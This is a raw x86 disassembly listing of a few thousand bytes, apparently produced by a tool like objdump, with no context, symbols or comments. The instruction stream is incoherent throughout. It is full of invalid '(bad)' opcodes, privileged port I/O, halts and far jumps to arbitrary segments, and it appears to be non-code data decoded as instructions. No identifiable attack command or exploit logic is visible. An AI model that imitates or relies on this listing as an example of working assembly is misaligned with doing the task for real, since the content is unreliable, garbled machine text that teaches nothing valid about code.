  42363c:	mov    ebp,0xd2b7c1ef
  423641:	int    0xe8
  423643:	fidivr DWORD PTR [ecx-0x2328192c]
  423649:	int    0xcd
  42364b:	aam    0xf0
  42364d:	mov    ch,0xe5
  42364f:	cli    
  423650:	test   BYTE PTR [ecx],0xc0
  423653:	sti    
  423654:	lds    ecx,FWORD PTR [edi]
  423656:	add    eax,0xe8d3fc03
  42365b:	les    edi,FWORD PTR [eax-0x1a141c0d]
  423661:	mov    bh,0xb7
  423663:	mov    cl,0xfb
  423665:	(bad)  
  423666:	xlat   BYTE PTR ds:[ebx]
  423667:	xlat   BYTE PTR ds:[ebx]
  423668:	not    ebp
  42366a:	retf   0xd0d2
  42366d:	sti    
  42366e:	repnz rol esp,0xdd
  423672:	hlt    
  423673:	(bad)  
  423674:	jecxz  0x423651
  423676:	retf   
  423677:	fsqrt  
  423679:	stc    
  42367a:	shl    cl,0xd0
  42367d:	leave  
  42367e:	int3   
  42367f:	div    DWORD PTR [edx-0xf333515]
  423685:	in     eax,dx
  423686:	out    dx,eax
  423687:	fdivr  QWORD PTR [esi-0x80f304b]
  42368d:	cld    
  42368e:	shl    bh,cl
  423690:	int3   
  423691:	xlat   BYTE PTR ds:[ebx]
  423692:	add    bl,dh
  423694:	or     cl,cl
  423696:	stc    
  423697:	(bad)  
  423698:	in     eax,0xc9
  42369a:	stc    
  42369b:	jmp    0xd4ae:0xbce9e2b8
  4236a2:	cmc    
  4236a3:	ror    cl,0xc7
  4236a6:	mov    ch,0xc8
  4236a8:	repz fcomp st(3)
  4236ab:	add    DWORD PTR [edi-0x2d041a10],edi
  4236b1:	retf   
  4236b2:	rcr    edi,1
  4236b4:	pop    es
  4236b5:	jmp    0x4440285
  4236ba:	or     BYTE PTR [esp+ecx*8-0x4b333e1e],ch
  4236c1:	in     al,dx
  4236c2:	jmp    0xd1f5:0xf6e9bbd5
  4236c9:	lock mov ah,0xb8
  4236cc:	ror    dh,1
  4236ce:	int    0x6
  4236d0:	shl    edi,0xf0
  4236d3:	shl    dh,1
  4236d5:	leave  
  4236d6:	add    ebp,ebp
  4236d8:	push   es
  4236d9:	sar    esi,0xc6
  4236dc:	shr    ah,0xf3
  4236df:	repnz stos BYTE PTR es:[edi],al
  4236e1:	sar    DWORD PTR [edx-0x334b0b45],1
  4236e7:	out    dx,eax
  4236e8:	iret   
  4236e9:	add    bh,ch
  4236eb:	enter  0xc3e1,0xbd
  4236ef:	cmc    
  4236f0:	cmc    
  4236f1:	out    0xe3,eax
  4236f3:	ret    
  4236f4:	add    eax,0xced9e707
  4236f9:	add    al,0x7
  4236fb:	scas   eax,DWORD PTR es:[edi]
  4236fc:	int3   
  4236fd:	scas   al,BYTE PTR es:[edi]
  4236fe:	rcr    ch,cl
  423700:	loope  0x4236ef
  423702:	shl    BYTE PTR [esi-0x2d13052e],cl
  423708:	int3   
  423709:	mov    eax,0xd5e3fbed
  42370e:	add    bl,dh
  423710:	mov    esi,0x8fde6ea
  423715:	fcomp  st(6)
  423717:	(bad)  ds:0xeeb8d206
  42371d:	(bad)  
  42371e:	lock loope 0x4236e4
  423721:	loopne 0x423713
  423723:	cmc    
  423724:	mov    bh,0xd4
  423726:	mov    ebx,0xd9ebd2df
  42372b:	ror    eax,0xbf
  42372e:	mov    DWORD PTR [ecx],0xfcd4f2de
  423734:	jmp    0xc0dfcfd
  423739:	repnz adc ah,dh
  42373c:	jmp    0xdbc4:0xc7b1dcb1
  423743:	clc    
  423744:	mov    bh,0xfe
  423746:	leave  
  423747:	jmp    0x6f1:0xf2ffbff7
  42374e:	mov    esp,0x1cbf4fe
  423753:	fdiv   st,st(4)
  423755:	fimul  WORD PTR [eax]
  423757:	fxch   st(7)
  423759:	fst    QWORD PTR [edx]
  42375b:	fxch   st(1)
  42375d:	shl    eax,0xbd
  423760:	imul   ecx
  423762:	sti    
  423763:	mov    cl,0xe0
  423765:	leave  
  423766:	jmp    0x423752
  423768:	iret   
  423769:	add    ch,ch
  42376b:	clc    
  42376c:	(bad)  
  42376e:	(bad)  
  42376f:	cld    
  423770:	(bad)
  423773:	fisttp DWORD PTR [edx]
  423775:	rcr    eax,0xfd
  423778:	add    ch,al
  42377a:	icebp  
  42377b:	scas   al,BYTE PTR es:[edi]
  42377c:	out    dx,al
  42377d:	into   
  42377e:	(bad)
  423781:	shl    al,1
  423783:	(bad)  
  423784:	retf   
  423785:	hlt    
  423786:	icebp  
  423787:	(bad)  
  423788:	mov    dl,0xd4
  42378a:	int3   
  42378b:	jmp    0xfb492548
  423790:	test   bl,0x4
  423793:	(bad)
  423796:	call   0x6484a9b
  42379b:	in     eax,dx
  42379c:	lds    ebp,FWORD PTR [eax-0x4d33284a]
  4237a2:	loopne 0x42375a
  4237a4:	leave  
  4237a5:	(bad)  
  4237a6:	fcomi  st,st(2)
  4237a8:	les    edi,FWORD PTR [eax-0x42432a45]
  4237ae:	aam    0x5
  4237b0:	sti    
  4237b1:	cmc    
  4237b2:	retf   
  4237b3:	hlt    
  4237b4:	ror    DWORD PTR [eax],0xd8
  4237b7:	(bad)  
  4237b9:	jecxz  0x42379a
  4237bb:	loop   0x42376c
  4237bd:	(bad)  
  4237be:	shl    dl,1
  4237c0:	int3   
  4237c1:	div    DWORD PTR [esi-0x1a055146]
  4237c7:	int    0xbc
  4237c9:	(bad)  
  4237cb:	int3   
  4237cc:	in     eax,dx
  4237cd:	aad    0x5
  4237cf:	(bad)  
  4237d0:	aam    0x2
  4237d2:	(bad)  
  4237d3:	fdivrp st(0),st
  4237d5:	fprem1 
  4237d7:	in     eax,0x7
  4237d9:	or     ch,ch
  4237db:	stos   DWORD PTR es:[edi],eax
  4237dc:	mov    eax,0xb0c2b0ca
  4237e1:	loopne 0x4237b4
  4237e3:	jmp    0x4237c9
  4237e5:	mov    ah,0xc4
  4237e7:	std    
  4237e8:	lock mov ebp,0xe7fdc8e8
  4237ee:	rcr    bl,cl
  4237f0:	in     eax,0xdd
  4237f2:	les    eax,FWORD PTR [esp+ebx*8]
  4237f5:	(bad)  
  4237f7:	out    dx,eax
  4237f8:	add    dl,bl
  4237fa:	push   cs
  4237fb:	retf   0xcef7
  4237fe:	repz (bad) 
  423801:	fcmovbe st,st(2)
  423803:	iret   
  423804:	fdivr  DWORD PTR [ebx-0xa0e3708]
  42380a:	mov    edi,0xd6cdbed3
  42380f:	stc    
  423810:	rol    BYTE PTR [edx],0xe0
  423813:	aam    0xd7
  423815:	(bad)  
  423817:	hlt    
  423818:	out    dx,al
  423819:	or     al,BYTE PTR [edi]
  42381b:	lock div DWORD PTR [ecx-0x1d493c4e]
  423822:	out    dx,al
  423823:	rcl    ebx,0xce
  423826:	xlat   BYTE PTR ds:[ebx]
  423827:	jmp    0x4237e8
  423829:	add    bl,ah
  42382b:	int3   
  42382c:	(bad)  
  42382e:	aam    0xdb
  423830:	or     esi,edi
  423832:	xlat   BYTE PTR ds:[ebx]
  423833:	retf   
  423834:	push   es
  423835:	sti    
  423836:	les    eax,FWORD PTR [ecx]
  423838:	jecxz  0x423827
  42383a:	or     DWORD PTR [ecx-0x17523743],edi
  423840:	jecxz  0x423803
  423842:	in     al,0xb0
  423844:	iret   
  423845:	(bad)
  423848:	in     al,0xf8
  42384a:	std    
  42384b:	ret    0xc0c0
  42384e:	out    dx,al
  42384f:	mov    esp,0xebd9bdd4
  423854:	dec    ecx
  423856:	loop   0x42382d
  423858:	aam    0xf
  42385a:	retf   
  42385b:	mov    esi,0xedddb2f7
  423860:	jmp    0xc1391927
  423865:	aam    0xc5
  423867:	jmp    0xfbb9:0xbdb0d9d9
  42386e:	mov    edi,0xc4e3e2d9
  423873:	add    cl,bl
  423875:	or     bl,cl
  423877:	(bad)  
  423879:	cld    
  42387a:	add    eax,0xd6e5c6d3
  42387f:	shl    bl,1
  423881:	shr    al,0xd6
  423884:	mov    ebx,0xf5defaf3
  423889:	sar    DWORD PTR [edi-0x420e46],1
  42388f:	in     al,dx
  423890:	mov    esp,0xf9d9c1e7
  423895:	rcl    esp,0xea
  423898:	fimul  DWORD PTR [ecx+ecx*8]
  42389b:	ret    0xaee7
  42389e:	bnd jmp 0xf207298f
  4238a4:	(bad)
  4238a7:	cld    
  4238a8:	ror    esp,1
  4238aa:	(bad)  
  4238ab:	cli    
  4238ac:	mov    edx,0xd801f6ec
  4238b1:	sti    
  4238b2:	test   ch,0xd6
  4238b5:	out    dx,eax
  4238b6:	(bad)  
  4238b7:	in     al,0xed
  4238b9:	out    dx,eax
  4238ba:	loopne 0x423898
  4238bc:	mov    al,0xeb
  4238be:	jmp    0xb0f6:0xb4adf4cf
  4238c5:	retf   0xf1d9
  4238c8:	shl    bh,cl
  4238ca:	cmc    
  4238cb:	clc    
  4238cc:	mov    ecx,0xe7cde2d1
  4238d1:	repnz add al,0x6
  4238d4:	rcr    dl,1
  4238d6:	push   es
  4238d7:	enter  0xafa,0xa
  4238db:	retf   
  4238dc:	mov    esi,0xcab2f7b3
  4238e1:	(bad)  
  4238e2:	aam    0xdb
  4238e4:	jmp    0xe3fbfec0
  4238e9:	retf   
  4238ea:	fld    QWORD PTR [eax]
  4238ec:	aad    0xe2
  4238ee:	(bad)  
  4238ef:	mov    ebp,0xff07c7e6
  4238f4:	retf   
  4238f5:	add    bl,ch
  4238f7:	(bad)  
  4238f9:	or     dh,dl
  4238fb:	(bad)  
  4238fd:	(bad)
  423900:	mov    ch,0xf7
  423902:	enter  0xb2b2,0xbb
  423906:	idiv   edi
  423908:	fnstcw WORD PTR [edi-0x272a4602]
  42390e:	loope  0x4238fd
  423910:	dec    BYTE PTR [edx]
  423912:	fstp   st(2)
  423914:	ret    0xe2e1
  423917:	add    edi,esp
  423919:	add    eax,0xedeae1ca
  42391e:	(bad)  
  423920:	fld    TBYTE PTR [ebp-0x13240e33]
  423926:	mov    dh,0xf8
  423928:	(bad)  
  42392a:	stc    
  42392b:	int3   
  42392c:	fadd   st(2),st
  42392e:	repnz (bad) 
  423931:	fsubrp st(5),st
  423933:	icebp  
  423934:	rcr    cl,1
  423936:	(bad)  
  423937:	mov    DWORD PTR [edx],0xbed3ca08
  42393d:	repnz (bad) 
  42393f:	lock lods al,BYTE PTR ds:[esi]
  423941:	shl    ch,1
  423943:	out    dx,al
  423944:	mov    bh,0xf4
  423946:	mov    ah,0xcb
  423948:	repz retf 
  42394a:	(bad)  
  42394b:	jecxz  0x42394b
  42394d:	add    edx,ebx
  42394f:	loope  0x423916
  423951:	cld    
  423952:	fdiv   st,st(6)
  423954:	add    dh,dh
  423956:	push   es
  423957:	(bad)  
  423959:	fldpi  
  42395b:	mov    ebp,0xd2c7a8e3
  423960:	repnz int3 
  423962:	(bad)
  423965:	mov    edi,0xc9bcf8d3
  42396a:	mov    ebx,0xd8d4e1db
  42396f:	loop   0x42392e
  423971:	out    0xfa,al
  423973:	or     ecx,DWORD PTR [edi]
  423975:	pop    es
  423976:	or     cl,BYTE PTR [ebx]
  423978:	loopne 0x423956
  42397a:	adc    ebp,ebx
  42397c:	les    esi,FWORD PTR [edi-0x39484818]
  423982:	stc    
  423983:	mov    ah,0xff
  423985:	(bad)  
  423987:	mov    dh,0xb4
  423989:	(bad)  
  42398a:	fiadd  DWORD PTR [ebx]
  42398c:	cli    
  42398d:	test   BYTE PTR [ecx],0xf5
  423990:	loop   0x423985
  423992:	cld    
  423993:	fiadd  WORD PTR [ebx*8+0x5edee]
  42399a:	or     dh,bl
  42399c:	jmp    0xdd370267
  4239a1:	mov    dl,0xb4
  4239a3:	shr    esp,0xb5
  4239a6:	in     al,0xeb
  4239a8:	enter  0xb9d9,0xd3
  4239ac:	mov    esi,0xbac1d5ed
  4239b1:	out    0xd6,eax
  4239b3:	or     al,dl
  4239b5:	call   0xd42c36c0
  4239ba:	pop    es
  4239bb:	icebp  
  4239bc:	rol    bl,1
  4239be:	retf   
  4239bf:	shr    DWORD PTR [ebp-0x3a441419],1
  4239c5:	xlat   BYTE PTR ds:[ebx]
  4239c6:	(bad)  
  4239c7:	xlat   BYTE PTR ds:[ebx]
  4239c8:	leave  
  4239c9:	mov    ch,0xe1
  4239cb:	rol    bl,cl
  4239cd:	cli    
  4239ce:	cld    
  4239cf:	(bad)
  4239d3:	fcomi  st,st(4)
  4239d5:	out    0xda,al
  4239d7:	add    al,dl
  4239d9:	pop    es
  4239da:	loope  0x4239c2
  4239dc:	scas   eax,DWORD PTR es:[edi]
  4239dd:	scas   eax,DWORD PTR es:[edi]
  4239de:	(bad)  
  4239df:	rol    bl,cl
  4239e1:	(bad)  
  4239e2:	ror    bh,cl
  4239e4:	mov    ah,0xdf
  4239e6:	xlat   BYTE PTR ds:[ebx]
  4239e7:	into   
  4239e8:	iret   
  4239e9:	add    ebp,edx
  4239eb:	in     eax,dx
  4239ec:	idiv   ebp
  4239ee:	std    
  4239ef:	idiv   BYTE PTR [esi-0x83b1639]
  4239f5:	cli    
  4239f6:	jecxz  0x423a07
  4239f8:	add    bh,dl
  4239fa:	fisubr WORD PTR [edi-0x13572228]
  423a00:	not    dh
  423a02:	mov    ch,0xe5
  423a04:	mov    dl,0xf1
  423a06:	enter  0xbcb5,0xb4
  423a0a:	icebp  
  423a0b:	add    ebp,edi
  423a0d:	(bad)  
  423a0e:	fcos   
  423a10:	mov    edx,0xfe00dee0
  423a15:	cli    
  423a16:	mov    edi,0xc3ec0cdc
  423a1c:	lock mov esi,0xe2cdcaf1
  423a22:	fidiv  DWORD PTR [ebp-0x250f1617]
  423a28:	repnz fucom st(3)
  423a2b:	std    
  423a2c:	(bad)  
  423a2e:	add    eax,0xdbc5d0da
  423a33:	stc    
  423a34:	jmp    0xee2:0xc80cc9db
  423a3b:	shl    DWORD PTR [ebx-0x30494c39],1
  423a41:	loopne 0x423a0b
  423a43:	mov    dl,0xcc
  423a45:	shl    edi,1
  423a47:	jmp    0xe020133b
  423a4c:	cli    
  423a4d:	mov    ch,0xff
  423a4f:	rol    DWORD PTR [eax],1
  423a51:	rol    dl,cl
  423a53:	imul   dl
  423a55:	or     bl,ch
  423a57:	fiadd  WORD PTR [eax*8-0xc511b31]
  423a5e:	lods   eax,DWORD PTR ds:[esi]
  423a5f:	call   0xbc040d34
  423a64:	fnsetpm(287 only) 
  423a66:	(bad)  
  423a67:	fcmovbe st,st(3)
  423a69:	repnz add al,BYTE PTR [edx]
  423a6c:	mov    edi,0xc4d301bc
  423a71:	cli    
  423a72:	retf   0xbee5
  423a75:	add    al,0xc5
  423a77:	or     eax,0xf2e2f3da
  423a7c:	mov    dl,0xb1
  423a7e:	jmp    0xd2b6:0xcdcbaab3
  423a85:	jmp    0xefc3:0xc8fee8d0
  423a8c:	pop    es
  423a8d:	cli    
  423a8e:	mov    esi,0xd80bdef4
  423a93:	out    0xe6,eax
  423a95:	out    dx,eax
  423a96:	dec    DWORD PTR [esi+ebx*8]
  423a99:	loope  0x423a79
  423a9b:	iret   
  423a9c:	fsub   st,st(0)
  423a9e:	out    0xf6,al
  423aa0:	lods   al,BYTE PTR ds:[esi]
  423aa1:	repz (bad) 
  423aa3:	cmc    
  423aa4:	out    dx,eax
  423aa5:	ror    ah,cl
  423aa7:	xlat   BYTE PTR ds:[ebx]
  423aa8:	cld    
  423aa9:	fsubr  st,st(1)
  423aab:	leave  
  423aac:	loopne 0x423a82
  423aae:	mov    edi,0xf6c1d0d1
  423ab3:	hlt    
  423ab4:	push   es
  423ab5:	fild   DWORD PTR [ecx]
  423ab7:	add    dl,cl
  423ab9:	iret   
  423aba:	repnz rcl dl,cl
  423abd:	mov    bl,0xf1
  423abf:	lock jmp 0xee3bfb79
  423ac5:	out    0xeb,al
  423ac7:	repnz imul edx
  423aca:	rol    BYTE PTR [eax],1
  423acc:	(bad)  
  423acd:	in     al,dx
  423ace:	push   es
  423acf:	(bad)  
  423ad0:	sti    
  423ad1:	std    
  423ad2:	in     eax,0xe0
  423ad4:	jmp    0x423aab
  423ad6:	jmp    0x423abd
  423ad8:	add    DWORD PTR [esi+ecx*1],eax
  423adb:	lds    edi,FWORD PTR [edi-0x1b3b4c3f]
  423ae1:	hlt    
  423ae2:	jmp    0xd3d2:0xdad8c9cc
  423ae9:	not    ch
  423aeb:	mov    esp,0xe4d8bfda
  423af0:	idiv   eax
  423af2:	std    
  423af3:	rol    BYTE PTR [ebx],1
  423af5:	sti    
  423af6:	pop    es
  423af7:	out    0xe8,eax
  423af9:	cld    
  423afa:	in     eax,dx
  423afb:	lock mov cl,0xc5
  423afe:	mov    al,0xd7
  423b00:	int    0xd1
  423b02:	int    0xd8
  423b04:	cmc    
  423b05:	xlat   BYTE PTR ds:[ebx]
  423b06:	mov    ecx,0xf3f5f6eb
  423b0b:	std    
  423b0c:	mov    edi,0xd3ecdb00
  423b11:	add    eax,0xe309f9c7
  423b16:	out    0xc6,eax
  423b18:	add    cl,bh
  423b1a:	loop   0x423ad4
  423b1c:	lods   al,BYTE PTR ds:[esi]
  423b1d:	mul    ebp
  423b1f:	mov    bh,0xad
  423b21:	shr    bh,cl
  423b23:	in     al,0xb2
  423b25:	fistp  QWORD PTR [edi-0x4307082b]
  423b2b:	cmc    
  423b2c:	int    0xe0
  423b2e:	mov    eax,0xf207c0cd
  423b33:	leave  
  423b34:	loopne 0x423b11
  423b36:	aam    0x9
  423b38:	(bad)  
  423b3a:	or     edx,esi
  423b3c:	iret   
  423b3d:	div    ch
  423b3f:	mov    cl,0xe4
  423b41:	jmp    0xf4b5:0xfbebebda
  423b48:	sti    
  423b49:	int    0xdc
  423b4b:	cld    
  423b4c:	icebp  
  423b4d:	aam    0xff
  423b4f:	out    0xd3,eax
  423b51:	in     al,0xbc
  423b53:	fsubp  st(1),st
  423b55:	jmp    0x423b61
  423b57:	fucomip st,st(2)
  423b59:	loop   0x423b3d
  423b5b:	(bad)  
  423b5c:	loope  0x423b49
  423b5e:	cmc    
  423b5f:	imul   edx
  423b61:	call   0xfb3e274d
  423b66:	enter  0xeccd,0xef
  423b6a:	std    
  423b6b:	mov    edi,0xf3e2f7c3
  423b70:	(bad)  
  423b71:	(bad)  
  423b73:	xlat   BYTE PTR ds:[ebx]
  423b74:	psubsw mm3,mm4
  423b77:	(bad)  
  423b79:	in     eax,dx
  423b7a:	int3   
  423b7b:	loope  0x423b25
  423b7d:	mov    dl,0xbe
  423b7f:	out    dx,eax
  423b80:	out    dx,eax
  423b81:	in     eax,dx
  423b82:	repnz fcmovu st,st(2)
  423b85:	jmp    0xb53d3068
  423b8a:	test   DWORD PTR [eax],0xc6d3ccf7
  423b90:	or     esp,esp
  423b92:	retf   
  423b93:	sti    
  423b94:	out    dx,eax
  423b95:	fmul   st,st(2)
  423b97:	fsubrp st(6),st
  423b99:	(bad)  
  423b9a:	std    
  423b9b:	into   
  423b9c:	shr    DWORD PTR [ebp-0xa534f58],1
  423ba2:	into   
  423ba3:	(bad)  
  423ba4:	cli    
  423ba5:	into   
  423ba6:	in     al,0xdb
  423ba8:	stc    
  423ba9:	sti    
  423baa:	int    0xf0
  423bac:	jecxz  0x423b67
  423bae:	mov    ah,0xe4
  423bb0:	int3   
  423bb1:	div    edx
  423bb3:	fcmovb st,st(7)
  423bb5:	sti    
  423bb6:	push   cs
  423bb7:	pop    es
  423bb8:	push   cs
  423bb9:	(bad)  
  423bba:	clc    
  423bbb:	mov    edi,0xdcb3c9ef
  423bc0:	lods   al,BYTE PTR ds:[esi]
  423bc1:	retf   0xe1fa
  423bc4:	fcomip st,st(3)
  423bc6:	retf   0xcfe9
  423bc9:	xlat   BYTE PTR ds:[ebx]
  423bca:	cld    
  423bcb:	mov    edi,0xe0d0fbc0
  423bd0:	rol    ah,0xb8
  423bd3:	in     eax,0xef
  423bd5:	add    esp,ebx
  423bd7:	loop   0x423bb2
  423bd9:	fldln2 
  423bdb:	test   al,0xbc
  423bdd:	ffreep st(2)
  423bdf:	shr    ebp,1
  423be1:	int    0xa8
  423be3:	lock scas al,BYTE PTR es:[edi]
  423be5:	les    ebp,FWORD PTR [ecx+ebp*8-0x3d423206]
  423bec:	into   
  423bed:	out    dx,al
  423bee:	add    eax,0xbc1dcfe
  423bf3:	add    al,0xf8
  423bf5:	fld    DWORD PTR [edx]
  423bf7:	or     edi,ebp
  423bf9:	out    0xfc,al
  423bfb:	retf   
  423bfc:	xlat   BYTE PTR ds:[ebx]
  423bfd:	(bad)  
  423bfe:	jmp    0xf9f3fdc7
  423c03:	(bad)  
  423c05:	(bad)  
  423c06:	cmc    
  423c07:	in     eax,0xf6
  423c09:	cli    
  423c0a:	xlat   BYTE PTR ds:[ebx]
  423c0b:	xlat   BYTE PTR ds:[ebx]
  423c0c:	test   ah,0xf2
  423c0f:	repnz fstp TBYTE PTR [ebp-0x8030e0a]
  423c16:	retf   0xcdc7
  423c19:	out    0xeb,eax
  423c1b:	lock test eax,0xf3c0d0c3
  423c21:	repz loop 0x423c16
  423c24:	repnz into 
  423c26:	in     eax,dx
  423c27:	lock fnstsw WORD PTR [ecx-0x21094845]
  423c2e:	loopne 0x423c07
  423c30:	in     al,0xc1
  423c32:	in     eax,0xeb
  423c34:	fsubp  st(2),st
  423c36:	test   BYTE PTR [esi],0xec
  423c39:	or     eax,0xa8c6ced3
  423c3e:	aad    0xef
  423c40:	out    0xf5,eax
  423c42:	lods   al,BYTE PTR ds:[esi]
  423c43:	aam    0xcf
  423c45:	mov    edi,0xdcf1f5b8
  423c4a:	mov    esi,0xd8c7f0ce
  423c4f:	in     al,0xf2
  423c51:	(bad)  
  423c53:	mul    bh
  423c55:	cmc    
  423c56:	enter  0xc9c3,0xff
  423c5a:	loopne 0x423c0e
  423c5c:	jecxz  0x423c49
  423c5e:	jmp    0xe70af94d
  423c63:	(bad)  
  423c65:	(bad)  
  423c67:	in     eax,dx
  423c68:	mov    eax,0xbfd3dbfb
  423c6d:	test   DWORD PTR [edx],0xcae2f5c1
  423c73:	ret    
  423c74:	jmp    0x423c3f
  423c76:	clc    
  423c77:	push   es
  423c78:	out    0x7,al
  423c7a:	jmp    0xebee:0xd0f0a6e6
  423c81:	sar    ebx,1
  423c83:	mov    al,0xcb
  423c85:	retf   
  423c86:	call   0xda163661
  423c8b:	cld    
  423c8c:	out    dx,eax
  423c8d:	mov    eax,0x5dff6ee
  423c92:	repnz or ecx,DWORD PTR [edx]
  423c95:	push   es
  423c96:	stc    
  423c97:	push   es
  423c98:	fist   DWORD PTR [edx]
  423c9a:	add    ebx,eax
  423c9c:	repnz in eax,0xc4
  423c9f:	out    dx,al
  423ca0:	aad    0xb7
  423ca2:	mov    bl,0xd8
  423ca4:	mov    cl,0xad
  423ca6:	mov    ch,0xcc
  423ca8:	mov    dl,0xdb
  423caa:	fdivr  QWORD PTR [esi-0x28123812]
  423cb0:	cmc    
  423cb1:	rcr    edx,1
  423cb3:	(bad)  
  423cb4:	(bad)  
  423cb6:	add    dh,cl
  423cb8:	jmp    0xc0c8:0xbdb305c4
  423cbf:	hlt    
  423cc0:	loop   0x423c89
  423cc2:	mov    bl,0xd3
  423cc4:	clc    
  423cc5:	mov    ah,0xc9
  423cc7:	mov    ecx,0xbfd8dcdf
  423ccc:	mov    esi,0xc7dddeb9
  423cd1:	add    cl,bl
  423cd3:	add    bh,al
  423cd5:	fsubr  st,st(1)
  423cd7:	in     eax,0xe9
  423cd9:	(bad)  [edx]
  423cdb:	mov    esp,0xc1ebcbb2
  423ce0:	loopne 0x423cc6
  423ce2:	hlt    
  423ce3:	fnstcw WORD PTR [ecx-0x3622493b]
  423ce9:	shr    bh,cl
  423ceb:	ffree  st(3)
  423ced:	add    ecx,esi
  423cef:	clc    
  423cf0:	aad    0xc1
  423cf2:	repnz leave 
  423cf4:	stc    
  423cf5:	(bad)  
  423cf7:	aad    0xc
  423cf9:	retf   0xdf09
  423cfc:	out    0xd1,eax
  423cfe:	in     al,dx
  423cff:	shr    DWORD PTR [ecx+ecx*8-0xc34242e],0xf7
  423d07:	mov    edi,0xf6feb4ed
  423d0c:	stc    
  423d0d:	ror    esp,cl
  423d0f:	hlt    
  423d10:	mov    esp,0x5d7eac0
  423d16:	dec    DWORD PTR [edi]
  423d18:	hlt    
  423d19:	push   es
  423d1a:	faddp  st(4),st
  423d1c:	mov    eax,0xcbf5f2f2
  423d21:	lods   al,BYTE PTR ds:[esi]
  423d22:	fcmovbe st,st(5)
  423d24:	mov    ecx,0xddfed7b0
  423d29:	leave  
  423d2a:	into   
  423d2b:	add    bh,bl
  423d2d:	div    bh
  423d2f:	(bad)  
  423d31:	jmp    esi
  423d33:	neg    cl
  423d35:	out    0xf,al
  423d37:	add    cl,dh
  423d39:	jmp    0x423cfb
  423d3b:	jmp    0xb2f2:0xe0ead2e5
  423d42:	xlat   BYTE PTR ds:[ebx]
  423d43:	enter  0xeee5,0xef
  423d47:	call   esp
  423d49:	int3   
  423d4a:	in     eax,dx
  423d4b:	mov    edi,0xc1d5e1f3
  423d50:	hlt    
  423d51:	icebp  
  423d52:	mov    eax,0xfcc004e6
  423d57:	cli    
  423d58:	loop   0x423d59
  423d5a:	fucom  st(7)
  423d5c:	out    0xe6,al
  423d5e:	scas   al,BYTE PTR es:[edi]
  423d5f:	call   0xf70d001b
  423d64:	ror    dh,1
  423d66:	fucomi st,st(5)
  423d68:	(bad)  
  423d6a:	hlt    
  423d6b:	lock mov edi,0xdbddddfd
  423d71:	shl    dh,0xf9
  423d74:	pextrw eax,mm0,0xeb
  423d78:	std    
  423d79:	or     ah,dh
  423d7b:	ret    
  423d7c:	in     eax,0xe1
  423d7e:	jmp    0xcf2de840
  423d83:	test   ebx,0xb9b9ebc8
  423d89:	xlat   BYTE PTR ds:[ebx]
  423d8a:	cld    
  423d8b:	shr    esp,cl
  423d8d:	add    BYTE PTR [eax-0xe3d2509],bh
  423d93:	cli    
  423d94:	fsubp  st(7),st
  423d96:	(bad)  
  423d97:	clc    
  423d98:	out    0xff,al
  423d9a:	fisub  WORD PTR [edi-0x280c3f37]
  423da0:	in     eax,dx
  423da1:	sar    cl,cl
  423da3:	retf   
  423da4:	out    dx,al
  423da5:	mov    cl,0xcc
  423da7:	in     eax,dx
  423da8:	(bad)  
  423daa:	cmc    
  423dab:	xlat   BYTE PTR ds:[ebx]
  423dac:	(bad)  
  423dae:	ret    
  423daf:	call   edx
  423db1:	fucompp 
  423db3:	clc    
  423db4:	add    cl,al
  423db6:	or     edi,edi
  423db8:	add    al,0xf2
  423dba:	shr    ebp,cl
  423dbc:	ret    
  423dbd:	rol    ebp,1
  423dbf:	into   
  423dc0:	in     eax,0xc8
  423dc2:	mov    ah,0xc9
  423dc4:	call   0xe93d33c0
  423dc9:	aad    0xb9
  423dcb:	fsubrp st(3),st
  423dcd:	rcl    cl,0xdc
  423dd0:	push   edi
  423dd2:	shl    ah,1
  423dd4:	cli    
  423dd5:	add    ecx,DWORD PTR [eax]
  423dd7:	push   es
  423dd8:	or     al,cl
  423dda:	in     al,0xec
  423ddc:	jecxz  0x423d8e
  423dde:	rol    bh,cl
  423de0:	retf   
  423de1:	lods   eax,DWORD PTR ds:[esi]
  423de2:	in     al,0xe4
  423de4:	into   
  423de5:	out    dx,eax
  423de6:	mov    edi,0xf4d6e8fc
  423deb:	lock ret 
  423ded:	repz mul esp
  423df0:	loop   0x423db4
  423df2:	(bad)  
  423df4:	enter  0xd5fd,0xd8
  423df8:	fadd   DWORD PTR [esi]
  423dfa:	out    0xae,eax
  423dfc:	mov    esi,0xeec2d7c0
  423e01:	mov    ah,0xbb
  423e03:	(bad)  
  423e04:	in     eax,0xb7
  423e06:	mov    ecx,0xf7f8b2cc
  423e0b:	mov    bh,0xd2
  423e0d:	mov    esp,0xe7e505fd
  423e12:	aad    0xfe
  423e14:	aam    0xe6
  423e16:	clc    
  423e17:	aam    0xc6
  423e19:	in     al,dx
  423e1a:	into   
  423e1b:	(bad)  
  423e1c:	mov    ecx,0xf3ebc1dd
  423e22:	mov    bh,0xe1
  423e24:	mov    dh,0xf4
  423e26:	hlt    
  423e27:	stc    
  423e28:	mov    dh,0xbc
  423e2a:	shl    esi,1
  423e2c:	(bad)  
  423e2e:	aam    0xed
  423e30:	std    
  423e31:	out    0xe0,al
  423e33:	call   0xdf084318
  423e38:	out    0xe6,al
  423e3a:	loope  0x423e22
  423e3c:	rcl    bl,1
  423e3e:	rcl    ch,cl
  423e40:	not    bh
  423e42:	in     al,0xb5
  423e44:	not    bl
  423e46:	mov    al,0xdb
  423e48:	out    dx,eax
  423e49:	(bad)  
  423e4a:	out    dx,eax
  423e4b:	call   0xce240610
  423e50:	fiadd  WORD PTR [ebx]
  423e52:	add    al,bl
  423e54:	or     edi,esi
  423e56:	add    edi,ebp
  423e58:	loope  0x423e4d
  423e5a:	retf   
  423e5b:	les    esi,FWORD PTR [ecx-0x19371711]
  423e61:	mov    ebx,0xcdf3b5da
  423e66:	mov    edx,0xf8ffbbbf
  423e6b:	mov    esp,0x6d8fcc0
  423e70:	sar    DWORD PTR [ebp-0x28152108],1
  423e76:	psubw  mm3,mm2
  423e79:	into   
  423e7a:	(bad)  
  423e7c:	loop   0x423e5e
  423e7e:	in     al,dx
  423e7f:	in     eax,dx
  423e80:	out    dx,eax
  423e81:	out    0xf4,eax
  423e83:	leave  
  423e84:	mov    ecx,0xe3c4dfc6
  423e89:	fstp   st(3)
  423e8b:	loop   0x423e7c
  423e8d:	loopne 0x423e8f
  423e8f:	jecxz  0x423e4f
  423e91:	sar    edi,0xd4
  423e94:	fcmovnu st,st(1)
  423e96:	cli    
  423e97:	retf   
  423e98:	out    0xcc,al
  423e9a:	or     ch,al
  423e9c:	in     eax,0xb0
  423e9e:	iret   
  423e9f:	iret   
  423ea0:	rcl    dl,cl
  423ea2:	not    cl
  423ea4:	call   0xd818f564
  423ea9:	out    dx,al
